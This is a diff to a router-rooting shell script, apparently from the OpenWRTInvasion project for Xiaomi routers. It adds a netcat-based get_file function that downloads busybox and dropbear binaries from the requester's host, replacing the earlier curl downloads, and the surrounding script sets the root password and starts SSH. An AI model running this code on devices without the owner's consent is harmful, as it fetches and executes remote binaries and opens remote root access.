@@ -11,6 +11,11 @@ exploit() {
     echo "Done exploiting"
 }
 
+get_file() {
+    rm -rf "$2"
+    echo "$1" | nc $REMOTE_ADDR "$QUERY_STRING" >"$2"
+}
+
 setup_password() {
     # Override existing password, as the default one set by xiaomi is unknown
     # https://www.systutorials.com/changing-linux-users-password-in-one-command-line/
@@ -22,9 +27,7 @@ setup_busybox() {
     pgrep busybox | xargs kill || true
 
     cd /tmp
-    rm -rf busybox
-    # Rationale for using --insecure: https://github.com/acecilia/OpenWRTInvasion/issues/31#issuecomment-690755250
-    curl -L "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/busybox-mipsel" --insecure --output busybox
+    get_file busybox-mipsel busybox
     chmod +x busybox
 }
 
@@ -44,14 +47,13 @@ start_ssh() {
 
     # Clean
     rm -rf dropbear
-    rm -rf dropbear.tar.bz2
     rm -rf /etc/dropbear
 
     # kill/stop dropbear, in case it is running from a previous execution
     pgrep dropbear | xargs kill || true
 
     # Donwload dropbear static mipsel binary
-    curl -L "https://github.com/acecilia/OpenWRTInvasion/raw/master/script_tools/dropbearStaticMipsel.tar.bz2" --output dropbear.tar.bz2
+    get_file dropbearStaticMipsel.tar.bz2 dropbear.tar.bz2
     mkdir dropbear
     /tmp/busybox tar xvfj dropbear.tar.bz2 -C dropbear --strip-components=1
 
